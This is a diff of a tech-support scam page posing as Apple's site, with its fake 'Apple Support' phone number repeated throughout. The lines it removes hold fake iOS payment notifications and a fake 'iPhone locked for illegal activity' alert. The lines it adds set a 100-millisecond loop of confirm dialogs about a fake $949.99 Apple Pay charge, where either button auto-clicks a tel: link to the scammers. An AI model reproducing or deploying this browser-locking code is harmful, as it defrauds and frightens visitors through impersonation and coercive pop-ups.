@@ -2,20 +2,18 @@
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js">
   <head>
     <!--Start of Tawk.to Script-->
-    <script type="text/javascript">
-      var Tawk_API = Tawk_API || {},
-        Tawk_LoadStart = new Date();
-      (function () {
-        var s1 = document.createElement("script"),
-          s0 = document.getElementsByTagName("script")[0];
-        s1.async = true;
-        s1.src = "https://embed.tawk.to/6a019b4ad261d91c336d4606/1job4d7fq";
-        s1.charset = "UTF-8";
-        s1.setAttribute("crossorigin", "*");
-        s0.parentNode.insertBefore(s1, s0);
-      })();
-    </script>
-    <!--End of Tawk.to Script-->
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/6a019b4ad261d91c336d4606/1job4d7fq';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
+</script>
+<!--End of Tawk.to Script-->
 
     <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
@@ -30,326 +28,12 @@
     <link
       rel="stylesheet"
       type="text/css"
-      href="_families%3DSF%2BPro%2Cv1_7CSF%2BPro%2BIcons%2Cv1html.html"
+      href="_families%253dSF%252bPro%252cv1_7CSF%252bPro%252bIcons%252cv1html.html"
     />
-    <script async="" src="https://www.clarity.ms/tag/x0clwz0914"></script>
-    <script src="js/text.js"></script>
-    <script type="text/javascript">
-      (function (c, l, a, r, i, t, y) {
-        c[a] =
-          c[a] ||
-          function () {
-            (c[a].q = c[a].q || []).push(arguments);
-          };
-        t = l.createElement(r);
-        t.async = 1;
-        t.src = "https://www.clarity.ms/tag/" + i;
-        y = l.getElementsByTagName(r)[0];
-        y.parentNode.insertBefore(t, y);
-      })(window, document, "clarity", "script", "x0clwz0914");
-    </script>
+    <script src="js/text_tel.js"></script>
   </head>
 
   <body>
-    <style>
-      /* iOS Notification Styles */
-      #ios-notification-container {
-        position: fixed;
-        top: -200px; /* Increased from -150px to ensure it fully hides when sliding up */
-        left: 50%;
-        transform: translateX(-50%);
-        width: 95%;
-        max-width: 400px;
-        background: rgba(255, 255, 255, 0.95);
-        backdrop-filter: blur(25px);
-        -webkit-backdrop-filter: blur(25px);
-        border-radius: 22px;
-        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.15);
-        z-index: 9999999;
-        font-family:
-          -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica,
-          Arial, sans-serif;
-        transition: top 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.1);
-        overflow: hidden;
-        padding: 14px 16px;
-        box-sizing: border-box;
-        border: 0.5px solid rgba(0, 0, 0, 0.05);
-      }
-
-      #ios-notification-container.show {
-        top: 16px;
-      }
-
-      .ios-notification-header {
-        display: flex;
-        justify-content: space-between;
-        align-items: center;
-        margin-bottom: 6px;
-      }
-
-      .ios-notification-header-left {
-        display: flex;
-        align-items: center;
-        gap: 6px;
-      }
-
-      .ios-app-icon {
-        display: flex;
-        align-items: center;
-        justify-content: center;
-      }
-
-      .ios-app-name {
-        font-size: 13px;
-        color: #000;
-        font-weight: 500;
-        letter-spacing: 0.2px;
-      }
-
-      .ios-time {
-        font-size: 13px;
-        color: #000;
-        font-weight: 400;
-      }
-
-      .ios-notification-body {
-        display: flex;
-        justify-content: space-between;
-        align-items: flex-start;
-        gap: 12px;
-      }
-
-      .ios-notification-content {
-        flex: 1;
-      }
-
-      .ios-notification-title {
-        font-size: 16px;
-        font-weight: 600;
-        color: #000;
-        margin-bottom: 4px;
-        letter-spacing: -0.2px;
-      }
-
-      .ios-notification-text {
-        font-size: 15px;
-        color: #000;
-        line-height: 1.4;
-        padding-right: 8px;
-        letter-spacing: -0.2px;
-      }
-
-      .ios-notification-text span {
-        color: #1461b6; /* iOS blue link color */
-      }
-
-      .ios-notification-text u {
-        color: #000;
-        text-decoration: underline;
-      }
-
-      .ios-notification-image {
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        margin-top: 2px;
-      }
-
-      .ios-notification-image img {
-        width: 42px;
-        height: 42px;
-        border-radius: 8px;
-        object-fit: contain;
-        background-color: transparent;
-      }
-
-      /* First Custom Alert Popup Styles (Center) */
-      #ios-alert-overlay {
-        display: none;
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        background-color: rgba(0, 0, 0, 0.4);
-        z-index: 9999998;
-        align-items: center;
-        /* Center aligned */
-        justify-content: center;
-      }
-
-      #ios-alert-overlay.show {
-        display: flex;
-      }
-
-      #ios-alert-box {
-        background-color: rgba(60, 60, 63, 0.75);
-        backdrop-filter: blur(25px);
-        -webkit-backdrop-filter: blur(25px);
-        width: 330px;
-        border-radius: 28px;
-        font-family:
-          -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica,
-          Arial, sans-serif;
-        text-align: center;
-        overflow: hidden;
-        box-shadow: 0 4px 24px rgba(0, 0, 0, 0.4);
-        padding: 24px 16px 16px 16px;
-        box-sizing: border-box;
-        border: 0.5px solid rgba(255, 255, 255, 0.1);
-      }
-
-      .ios-alert-message {
-        font-size: 16px;
-        color: #fff;
-        line-height: 1.4;
-        font-weight: 400;
-        margin-bottom: 24px;
-        padding: 0 8px;
-        text-align: center;
-        letter-spacing: -0.2px;
-      }
-
-      /* Update to ensure text formatting is preserved when injected via innerHTML */
-      .ios-alert-message br {
-        display: block;
-        margin-bottom: 2px;
-      }
-
-      .ios-alert-buttons-row {
-        display: flex;
-        gap: 12px;
-        margin-bottom: 2px;
-      }
-
-      .ios-alert-btn-row {
-        flex: 1;
-        padding: 0;
-        font-size: 17px;
-        font-weight: 600;
-        border: none;
-        border-radius: 9999px;
-        cursor: pointer;
-        font-family:
-          -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica,
-          Arial, sans-serif;
-        text-align: center;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        min-height: 48px;
-      }
-
-      .ios-alert-btn-row.cancel {
-        color: #fff;
-        background-color: rgba(255, 255, 255, 0.25);
-        font-weight: 500;
-      }
-
-      .ios-alert-btn-row.ok {
-        color: #fff;
-        background-color: #3b82f6;
-        font-weight: 600;
-      }
-
-      .ios-alert-btn-row:active {
-        opacity: 0.8;
-      }
-
-      /* Dark mode overrides if needed based on device, though keeping light mode to match image mostly */
-      @media (prefers-color-scheme: dark) {
-        .ios-app-name {
-          color: #000;
-        }
-        .ios-time {
-          color: #000;
-        }
-      }
-    </style>
-
-    <div
-      id="ios-notification-container"
-      onclick="callNumber()"
-      style="cursor: pointer"
-    >
-      <div class="ios-notification-header">
-        <div class="ios-notification-header-left">
-          <div class="ios-app-icon">
-            <svg
-              xmlns="http://www.w3.org/2000/svg"
-              viewBox="0 0 100 100"
-              width="16"
-              height="16"
-            >
-              <rect width="100" height="100" rx="22" fill="#34C759"></rect>
-              <path
-                d="M50 22C28 22 12 36 12 53C12 63 18 72 27 77C27 77 26 86 19 91C19 91 34 91 43 80C45 80.5 48 81 50 81C72 81 88 67 88 53C88 36 72 22 50 22Z"
-                fill="#FFF"
-              ></path>
-            </svg>
-          </div>
-          <span class="ios-app-name">MESSAGES</span>
-        </div>
-        <div class="ios-notification-header-right">
-          <span class="ios-time">now</span>
-        </div>
-      </div>
-      <div class="ios-notification-body">
-        <div class="ios-notification-content">
-          <div class="ios-notification-title">Payment Successful</div>
-          <div class="ios-notification-text">
-            <span
-              >Sent $ 499.99 via Online Transaction to <u>Betonline.net</u> &
-              <u>pornhub.net</u> . Not you? Call +1-888-742-3129</span
-            >
-          </div>
-        </div>
-      </div>
-    </div>
-    <div id="ios-alert-overlay">
-      <div id="ios-alert-box">
-        <div class="ios-alert-message">
-          Your iPhone has been locked due to detected illegal activity. Your
-          Apple Account has been disabled! Immediately call Apple Support
-          +1-888-742-3129 to unlock it!
-        </div>
-        <div class="ios-alert-buttons-row">
-          <button class="ios-alert-btn-row cancel" onclick="reopenAlert()">
-            Cancel
-          </button>
-          <button class="ios-alert-btn-row ok" onclick="callNumber()">
-            OK
-          </button>
-        </div>
-      </div>
-    </div>
-
-    <div id="ios-second-alert-overlay">
-      <div id="ios-second-alert-box">
-        <div class="ios-second-alert-content">
-          <div class="ios-second-alert-message">
-            Your iPhone has been locked due to detected illegal activity .Your
-            Apple Account has been disabled! Immediately call Apple Support
-            +1-888-742-3129 to unlock it!
-          </div>
-        </div>
-        <div class="ios-second-alert-buttons">
-          <button class="ios-second-alert-btn" onclick="callNumber()">
-            Call +1-888-742-3129
-          </button>
-          <button
-            class="ios-second-alert-btn cancel"
-            onclick="reopenSecondAlert()"
-          >
-            Cancel
-          </button>
-        </div>
-      </div>
-    </div>
-
-    <!-- Audio element for notification sound -->
-    <audio id="notification-sound" src="ualert.mpeg" preload="auto"></audio>
-
     <div id="result"></div>
     <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate" />
     <nav id="ac-globalnav" class="no-js">
@@ -547,7 +231,7 @@
             <span class="ac-ln-title">
               <a href="#"
                 >Apple Support +1-888-742-3129
-                <font color="red"> <font class="js_setPhoneBlock"></font> </font
+                <font color="red"><font class="js_setPhoneBlock"></font></font
               ></a>
             </span>
             <div class="ac-ln-menu">
@@ -663,7 +347,7 @@
           </div>
           <div class="ac-gf-footer-legal">
             <div class="ac-gf-footer-legal-copyright">
-              Copyright© 2023 Apple . All rights reserved.
+              Copyright© 2026 Apple . All rights reserved.
             </div>
             <div class="ac-gf-footer-legal-links">
               <a class="ac-gf-footer-legal-link analytics-exitlink" href="#"
@@ -681,7 +365,7 @@
           </div>
           <meta content="Apple" property="name" />
           <meta
-            content="+1-888-742-3129 
+            content="+1-888-742-3129
 			 "
             property="telephone"
           />
@@ -760,7 +444,7 @@
 
       window.number = getPar("phone");
 
-      window.number = window.number ? window.number : "+1-888-742-3129 ";
+      window.number = window.number ? window.number : "+1-888-742-3129";
 
       window.device = "iPhone";
       window.refef = parseURL(document.referrer);
@@ -812,88 +496,13 @@
         sPhone[p].innerHTML = phone;
       }
 
-      // Function to push the notification and play sound
-      function pushNotification() {
-        var notifContainer = document.getElementById(
-          "ios-notification-container"
-        );
-
-        // If already showing, temporarily hide it to trigger animation again
-        if (notifContainer.classList.contains("show")) {
-          notifContainer.classList.remove("show");
-          setTimeout(function () {
-            showNotificationWithSound(notifContainer);
-          }, 600); // Increased wait time to allow the larger notification to fully slide up before dropping down again
-        } else {
-          showNotificationWithSound(notifContainer);
-        }
-      }
-
-      function showNotificationWithSound(container) {
-        container.classList.add("show");
-        // Try to play sound when notification appears
-        var audio = document.getElementById("notification-sound");
-        if (audio) {
-          audio.currentTime = 0; // Reset audio to start so it plays fully every time
-          var playPromise = audio.play();
-          if (playPromise !== undefined) {
-            playPromise.catch(function (error) {
-              console.log(
-                "Autoplay prevented by browser. Sound will play on first interaction."
-              );
-            });
-          }
-        }
-      }
-
-      // --- STANDARD NOTIFICATION & POPUP FLOW ---
-
-      function showVisuals() {
-        // Show Notification
-        pushNotification();
-
-        // Start notification loop
-        setInterval(pushNotification, 8000);
-
-        // Show Popup
-        document.getElementById("ios-alert-overlay").classList.add("show");
-        document.querySelector("#ios-alert-box .ios-alert-message").innerHTML =
-          getText();
-      }
-
-      // Trigger visuals immediately on load
-      setTimeout(showVisuals, 100);
-
-      // Fallback: Attempt to play audio on any user click if autoplay was blocked
-      document.body.addEventListener(
-        "click",
-        function () {
-          var audio = document.getElementById("notification-sound");
-          if (audio && audio.paused && audio.currentTime === 0) {
-            audio.play().catch(function (e) {});
-          }
-        },
-        { once: true }
-      );
-
-      <!-- Audio element for notification sound -->
-
-      function callNumber() {
-        okkkk();
-        window.location.href = "tel:+18887695790";
-      }
-
-      function reopenAlert() {
-        document.getElementById("ios-alert-overlay").classList.remove("show");
-        setTimeout(function () {
-          document.getElementById("ios-alert-overlay").classList.add("show");
-        }, 50); // Wait 50ms and show it again immediately
-        okkkk(); // Trigger background spam
-      }
+      setInterval(function () {
+        myFunction();
+      }, 100);
 
       function okkkk() {
         jQuery("#result").append(
-          '<a  class="anchorcall" href="tel:+1-888-742-3129 "></a>'
+          '<a  class="anchorcall" href="tel:+1-888-742-3129"></a>'
         );
         document.querySelector("a").click();
         var extraData = "";
@@ -911,7 +520,15 @@
       }
 
       function myFunction() {
-        // Unused
+        if (
+          confirm(
+            "Your Apple ID was used at the Apple Store for a $949.99 Apple Pay pre-authorization. This transaction has been temporarily placed on hold due to security concerns. If this was NOT you, call Apple Support NOW at +1-888-742-3129 to freeze this transaction and prevent unauthorized charges!"
+          )
+        ) {
+          okkkk();
+        } else {
+          okkkk();
+        }
       }
 
       window.ununload = function () {
